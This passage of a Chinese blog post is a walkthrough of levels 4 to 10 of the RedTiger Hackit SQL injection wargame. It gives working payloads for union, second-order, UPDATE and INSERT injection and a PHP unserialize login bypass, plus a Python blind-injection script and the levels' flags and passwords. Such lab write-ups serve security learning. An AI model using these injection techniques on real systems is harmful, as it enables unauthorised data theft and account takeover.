&#x27;, chr(c)</span><br><span class="line">    result+=chr(c)</span><br><span class="line"></span><br><span class="line">print &#x27;result = &#x27;, result</span><br></pre></td></tr></table></figure>
+<p>还有python 提供了字符集，不用这么麻烦自己考虑了。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; help(string)</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    ascii_letters = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">    ascii_lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    ascii_uppercase = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">    digits = &#x27;0123456789&#x27;</span><br><span class="line">    hexdigits = &#x27;0123456789abcdefABCDEF&#x27;</span><br><span class="line">    letters = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    lowercase = &#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    octdigits = &#x27;01234567&#x27;</span><br><span class="line">    printable = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTU...</span><br><span class="line">    punctuation = &#x27;!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;</span><br><span class="line">    uppercase = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">    whitespace = &#x27;\t\n\x0b\x0c\r &#x27;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>You can raise your wechall.net score with this flag:
+e8bcb79c389f5e295bac81fda9fd7cfa The password for the next level is:
+there_is_a_truck</p>
+</blockquote>
+<h2 id="level5">level5</h2>
+<blockquote>
+<p>Target: Bypass the login Disabled: substring , substr, ( , ), mid
+Hints: its not a blind, the password is md5-crypted, watch the login
+errors</p>
+</blockquote>
+<p>不能进行盲注。那就先输入<code>admin</code>用户和随便一个密码，显示
+&gt; Some things are disabled!!</p>
+<p>看来<code>admin</code>这个词给过滤掉了。</p>
+<p>然后测试 <code>username</code> 是否存在注入点，输入<code>'</code>。
+&gt; Warning: mysql_num_rows() expects parameter 1 to be resource,
+boolean given in /var/www/html/hackit/level5.php on line 46 &gt; User
+not found!</p>
+<p>很好，然后熟练得测试出回显字段，得到2个回显字段。<code>' union select 1,2#</code>。这时显示的错误为
+&gt; Login failed! 说明我们绕过了 <code>username</code> ，接下来对
+<code>password</code> 进行测试。</p>
+<p>题目说 <code>password</code> 经过了 md5 加密，而且还过滤了
+<code>(</code> 与 <code>)</code> 两个字符。 因此将 <code>password</code>
+值为1，并对字符串'1'
+进行md5加密，MD5('1')='c4ca4238a0b923820dcc509a6f75849b'。 测试到底是
+select 的1位置用md5加密还是2位置用md5加密。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username= &#x27; union select 1,&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;#</span><br><span class="line">password=1</span><br></pre></td></tr></table></figure> 可以得到结果
+&gt; You can raise your wechall.net score with this flag:
+ca5c3c4f0bc85af1392aef35fc1d09b3 &gt; The password for the next level
+is: for_more_bugs_update_to_php7</p>
+<h2 id="level-6">level 6</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &#x27;http://redtiger.labs.overthewire.org/level6.php?user=1&#x27; -H &#x27;Cookie:  level6login=for_more_bugs_update_to_php7&#x27;</span><br></pre></td></tr></table></figure>
+<p>可以用常规注入对url参数
+<code>user=1</code>进行注入测试。但是测试回显字段时，未回显。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23</span><br></pre></td></tr></table></figure> 报错</p>
+<pre><code>User not found
+Login failed! </code></pre>
+<p>而得到user的username为 <code>deddlef</code> 。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,2,3,4,5%23</span><br></pre></td></tr></table></figure></p>
+<pre><code>Username:   deddlef
+Email:  dumbi@damibi.de</code></pre>
+<p>可以用 <code>'deddlef'</code> 替换
+<code>union select 1,2,3,4,5%23</code>
+中的各个回显位置。还是报错。服务器应该过滤了 <code>'</code>。 用16进制
+<code>0x646564646c6566</code> 继续替换查找，当替换 <code>2</code>
+时，得到正确的回显结果。 那么可以怀疑后台先根据 <code>id</code> 查找
+<code>username</code>，再根据 <code>username</code> 再次去查找
+user信息的，我们可以利用
+第二个回显位置进行进一步注入测试，但是要用16进制表示。
+<strong>二次注入</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 测试回显数量，仍然是5个位置。</span><br><span class="line"># &#x27; order by 5# =&gt; 0x27206f72646572206279203523</span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203523,3,4,5%23</span><br><span class="line"># &#x27; order by 6# =&gt; 0x27206f72646572206279203623</span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x27206f72646572206279203623,3,4,5%23</span><br></pre></td></tr></table></figure>
+<p>测试回显位： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># &#x27; union select 1,2,3,4,5# =&gt; 0x2720756e696f6e2073656c65637420312c322c332c342c3523</span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%23</span><br></pre></td></tr></table></figure></p>
+<pre><code>Username:   2
+Email:  4</code></pre>
+<p>That's ez! 接下来按照要求输出即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># &#x27; union select 1,username,3,password,5 from level6_users where status=1#   =&gt;  0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123</span><br><span class="line"></span><br><span class="line">http://redtiger.labs.overthewire.org/level6.php?user=0 union select 1,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%23</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Username: admin Email: m0nsterk1ll You can raise your wechall.net
+score with this flag: 074113b268d87dea21cc839954dec932 The password for
+the next level is: keep_in_mind_im_not_blind</p>
+</blockquote>
+<h2 id="level-7">level 7</h2>
+<p>正常输入 <code>google</code> 会得到以下信息。</p>
+<pre><code>Google: The browser is the computer
+SAN FRANCISCO--Google spent Wednesday morning trying to get developers excited about the next generation of Web t...</code></pre>
+<p>输入 <code>google'</code> 会得到很详细的sql语句报错。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br></pre></td></tr></table></figure></p>
+<p>想办法闭合google前面的 <code>'%</code> ，也把后面给注释掉。于是输入
+<code>%')--+</code>，但是仍然报错。网上通过注释来解题的方法已经不好使了。</p>
+<p>不用注释掉后面，那么可以把后面的 <code>%'</code> 给闭合掉。输入
+<code>%' and '%'='</code> 即可得到正常页面。</p>
+<p>那么可以加入 <code>%' and 1=1 and '%'='</code></p>
+<p>此题用布尔型盲注。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google%&#x27; and 1=1 and &#x27;%&#x27;=%&#x27; OR text.title LIKE &#x27;%google%&#x27; and 1=1 and &#x27;%&#x27;=%&#x27;)</span><br></pre></td></tr></table></figure>
+<p>除了过滤给出的函数外，还过滤了常用的注释符。</p>
+<p>对于过滤了字符串截取函数 <code>substr</code> , <code>left</code>
+的话，可以使用 <code>locate</code> 来进行代替。还需要通过
+<code>collate latin1_general_cs</code> 或者 <code>latin1_bin</code>
+来判断字符的大小写。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">LEFT(str,len)</span><br><span class="line">Returns the leftmost len characters from the string str, or NULL if any argument is NULL.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SUBSTR(str,pos), SUBSTR(str FROM pos), SUBSTR(str,pos,len), SUBSTR(str FROM pos FOR len) </span><br><span class="line">SUBSTR() is a synonym for SUBSTRING().</span><br><span class="line"></span><br><span class="line">SUBSTRING(str,pos), SUBSTRING(str FROM pos), SUBSTRING(str,pos,len),SUBSTRING(str FROM pos FOR len)</span><br><span class="line">The forms without a len argument return a substring from string str starting at position pos. The forms with a len argument return a substring len characters long from string str, starting at position pos. The forms that use FROM are standard SQL syntax. It is also possible to use a negative value for pos. In this case, the beginning of the substring is pos characters from the end of the string, rather than the beginning. A negative value may be used for pos in any of the forms of this function. </span><br><span class="line"></span><br><span class="line">LOCATE(substr,str), LOCATE(substr,str,pos)</span><br><span class="line">The first syntax returns the position of the first occurrence of substring substr in string str. The second syntax returns the position of the first occurrence of substring substr in string str, starting at position pos. Returns 0 if substr is not in str. Returns NULL if substr or str is NULL. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先得到 <code>autor</code> 字段的长度。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">cookies=&#123;&quot;level7login&quot;: &quot;keep_in_mind_im_not_blind&quot;&#125;</span><br><span class="line">url_base = &quot;http://redtiger.labs.overthewire.org/level7.php&quot;</span><br><span class="line">params=&#123;&quot;dosearch&quot; : &quot;search!&quot;, &quot;search&quot;: &quot;google&quot; &#125;</span><br><span class="line">headers = &#123;&quot;Connection&quot;: &quot;close&quot;&#125;</span><br><span class="line"></span><br><span class="line">def get_len():</span><br><span class="line">    lens=1</span><br><span class="line">    while lens &lt; 50:</span><br><span class="line">        print &quot;lens is &quot;, lens</span><br><span class="line">        params[&#x27;search&#x27;] = &quot;google%&#x27; and length(news.autor)=&#123;0&#125; and &#x27;%&#x27;=&#x27;&quot;.format(lens)</span><br><span class="line">        resp =requests.post(url_base, data=params, cookies=cookies)</span><br><span class="line">        if resp.status_code != 200:</span><br><span class="line">            print &quot;status code is not 200&quot;</span><br><span class="line">        content = resp.content</span><br><span class="line">        #found id</span><br><span class="line">        if content.find(&quot;Google: The browser is the computer&quot;) != -1 :</span><br><span class="line">            break</span><br><span class="line">        lens+=1</span><br><span class="line">    return lens</span><br></pre></td></tr></table></figure></p>
+<p>得到17，然后逐一比较出每个字符。这里需要注意，服务器过滤了很多字符，比如
+<code>&lt;</code> 、 <code>&gt;</code> ，<code>substr</code> 、
+<code>substring</code> 、 <code>left</code>
+等。只能用相等关系来比较了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">lens= 17</span><br><span class="line">def get_item():</span><br><span class="line">    result=&quot;&quot;</span><br><span class="line">    for start in range(5, lens+1):</span><br><span class="line">        print &quot;scanning &quot;, start, &quot; position&quot;</span><br><span class="line">        for char in string.printable:</span><br><span class="line">            params[&#x27;search&#x27;]=&quot;google%&#x27; and locate(&#x27;&#123;0&#125;&#x27;,news.autor collate latin1_bin,&#123;1&#125;)=&#123;1&#125; and &#x27;%&#x27;=&#x27;&quot;.format(char, start)</span><br><span class="line">            #print params</span><br><span class="line">            try:</span><br><span class="line">                resp =requests.post(url_base, data=params, cookies=cookies, headers=headers)</span><br><span class="line">            except requests.exceptions.ConnectionError:</span><br><span class="line">                print &quot;Connection refused by the server..&quot;</span><br><span class="line">                sleep(3)</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            if resp.status_code != 200:</span><br><span class="line">                print &quot;status code is not 200&quot;</span><br><span class="line">            content = resp.content</span><br><span class="line">            #found id</span><br><span class="line">            if content.find(&quot;Google: The browser is the computer&quot;) != -1 :</span><br><span class="line">                print &quot;#Found &quot;, (char)</span><br><span class="line">                result+= (char)</span><br><span class="line">                break</span><br><span class="line">    return result</span><br><span class="line">result = get_item()</span><br><span class="line">print &quot;result is &quot;, result</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><strong>注意</strong></p>
+<p>1.Max retries exceeded with URL</p>
+<p>访问太频繁会<code>requests</code> 包会报错上述错误。可以根据
+<code>requests.exceptions.ConnectionError</code> 来判断。
+这时候可以降低访问速度，即休眠几秒钟。还有就是当发送HTTP请求包的时候，让服务器断开连接。在请求包的
+<code>headers</code> 中加入 <code>&#123;"Connection": "close"&#125;</code> 。</p>
+<p>2.校对规则 <code>collation</code></p>
+<p>校对规则是怎么回事呢？它是一组规则，负责决定某一字符集下的字符进行比较和排序的结果。</p>
+<p>比如说，有latin1字符集中的字母A和a，我们需要它们在比较的时候相等，那么，我们可以使用字符集校对规则
+latin1_general_ci；这种校对规则在比较和排序的时候不区分大小写；如果我们需要他们在比较的时候不等呢？也很简单，我们可以使用字符集校对规则latin1_bin;这种校对规则会以二进制的方式对字符进行比较，很明显，a和A的二进制编码不同，比较的结果就是不等。</p>
+<p>可以通过 <code>show collation</code>
+来查看数据库对校对规则的支持。</p>
+<p>答案是 <code>TestUserforg00gle</code></p>
+<blockquote>
+<p>User correct. You can raise your wechall.net score with this flag:
+970cecc0355ed85306588a1a01db4d80 The password for the next level is:
+no_pernel_kanic_on_the_titanic</p>
+</blockquote>
+<h2 id="level-8">level 8</h2>
+<p>点击 <code>edit</code> ，可以更改用户的信息。</p>
+<p>测试注入点，在 <code>email</code> 处输入 <code>'</code>
+得到报错信息。</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the &gt; right syntax to
+use near '12345', age = '25' WHERE id = 1' at line 3</p>
+</blockquote>
+<p>在 <code>email</code> 的内容前面输入
+<code>'</code>，得到更精确的信息。</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the &gt; right syntax to
+use near 'hans@localhost'', icq = '12345', age = '25' WHERE id = 1' at
+line 3</p>
+</blockquote>
+<p>可以确定这是一条更新语句。 猜测sql语句为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user set email=&#x27;$email&#x27;,icq=&#x27;$icq&#x27;,age=&#x27;$age&#x27; where id=1 </span><br></pre></td></tr></table></figure> 可以利用
+<code>update</code> 将 <code>password</code>更新到 <code>name</code>
+字段，注意 <code>'</code>的闭合。</p>
+<p>update user set
+email='hans@localhost<code>',name=password,icq='</code>',icq='12345',age='25'
+where id=1</p>
+<blockquote>
+<p>You can raise your wechall.net score with this flag:
+9ea04c5d4f90dae92c396cf7a6787715 The password for the next level is:
+cybercyber_vuln</p>
+</blockquote>
+<h2 id="level-9">level 9</h2>
+<p>这题输入<code>autor=123</code>、 <code>title=123</code>、
+<code>text=123</code> 会在数据库中插入此条信息。</p>
+<p>分别测试三个字段，发现注入点在 <code>text</code>
+字段。报错信息为：</p>
+<blockquote>
+<p>You have an error in your SQL syntax; check the manual that
+corresponds to your MySQL server version for the &gt; right syntax to
+use near ''123'')' at line 6</p>
+</blockquote>
+<p>这里SQL语句还原应该是 <code>'$text')</code> ，这里应当是
+<code>insert</code> 语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into tablename(autor, title, text) values(&#x27;$autor&#x27;, &#x27;$title&#x27;, &#x27;$text&#x27;);</span><br></pre></td></tr></table></figure>
+<p>测试，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autor=123&amp;title=123&amp;text=123&#x27;),(&#x27;4&#x27;,&#x27;5&#x27;,&#x27;6&amp;post=Submit+Query</span><br></pre></td></tr></table></figure>
+<p>成功。</p>
+<p>根据题目要求，<code>Get username and password of any user. Tablename: level9_users</code>
+。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autor=123&amp;title=123&amp;text=123&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;6&amp;post=Submit+Query</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Autor: TheBlueFlower Title: this_oassword_is_SEC//Ure.promised! 6</p>
+</blockquote>
+<blockquote>
+<p>You can raise your wechall.net score with this flag:
+84ec870f1ac294508400e30d8a26a679 The password for the next level is:
+get_post_cookie_head__kittens_eating_all_my_bread</p>
+</blockquote>
+<h2 id="level-10">level 10</h2>
+<p>点击 <code>Login</code> 得到登陆用户为 <code>Monkey</code>。
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=YToyOntzOjg6InVzZXJuYW1lIjtzOjY6Ik1vbmtleSI7czo4OiJwYXNzd29yZCI7czoxMjoiMDgxNXBhc3N3b3JkIjt9</span><br></pre></td></tr></table></figure></p>
+<p>注入<code>'</code> 到 <code>login</code>参数，得到正常结果，但是将
+<code>login</code> 原参数删除一些字符后，得到报错结果。</p>
+<blockquote>
+<p>Notice: unserialize(): Error at offset 68 of 68 bytes in
+/var/www/html/hackit/level10.php on line 34</p>
+</blockquote>
+<p><code>login</code>的值为字母和数字的组合，应该是 <code>Base64</code>
+加密后的结果，用 <code>base64</code> 解密，可得：</p>
+<pre><code>a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</code></pre>
+<p>在用PHP 的 <code>unserialize</code> 反序列化得到：</p>
+<pre><code>array (
+  &#39;username&#39; =&gt; &#39;Monkey&#39;,
+  &#39;password&#39; =&gt; &#39;0815password&#39;,
+)</code></pre>
+<p>由于是 <code>array</code> 数据， 可以将 <code>password</code> 设置为
+<code>true</code>， 绕过密码判断。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array (</span><br><span class="line">  &#x27;username&#x27; =&gt; &#x27;TheMaster&#x27;,</span><br><span class="line">  &#x27;password&#x27; =&gt; true,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>经过 序列化 后得到 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>在经过 <code>Base64</code> 加密。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login=YToyOntzOjg6InVzZXJuYW1lIjtzOjk6IlRoZU1hc3RlciI7czo4OiJwYXNzd29yZCI7YjoxO30=&amp;dologin=Login</span><br></pre></td></tr></table></figure>
+<p>通关！</p>
+<blockquote>
+<p>Welcome TheMaster. You solved the hackit :) You can raise your
+wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52 The
+password for the hall of fame is: exec_is_safer_than_unserialize</p>
+</blockquote>
+<p>终于将10关搞定。</p>
+<blockquote>
+<p>Congratulation. You solved all 10 levels of the hackit. If you want
+to put your name into the hall of fame you can use the form below.</p>
+</blockquote>
+<h2 id="参考网站">参考网站</h2>
+<p>[1] <a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/web/sqli/">SQL
+注入</a> [2] <a
+target="_blank" rel="noopener" href="http://blog.csdn.net/helloc0de/article/details/76142478">SQL注入教程——（三）简单的注入尝试</a>
+[3] <a
+target="_blank" rel="noopener" href="https://blog.spoock.com/2016/07/25/redtiger-writeup/">Redtiger
+Hackit Writeup</a> [4] <a
+target="_blank" rel="noopener" href="http://ph0rse.me/2017/07/29/RedTiger-libs-writeup/">RedTiger libs
+writeup</a> [5] <a
+target="_blank" rel="noopener" href="http://lucifaer.com/index.php/archives/19/">RedTiger's
+Hackit</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2018/04/03/centos%E5%90%AF%E5%8A%A8%E5%8A%A0%E8%BD%BD%E9%A9%B1%E5%8A%A8/" rel="prev" title="centos启动加载驱动">
+                  <i class="fa fa-angle-left"></i> centos启动加载驱动
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2018/04/11/c%E6%96%87%E4%BB%B6%E8%B0%83%E7%94%A8cuda%E5%87%BD%E6%95%B0/" rel="next" title="c文件调用cuda函数">
+                  c文件调用cuda函数 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Max</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+</body>
+</html>
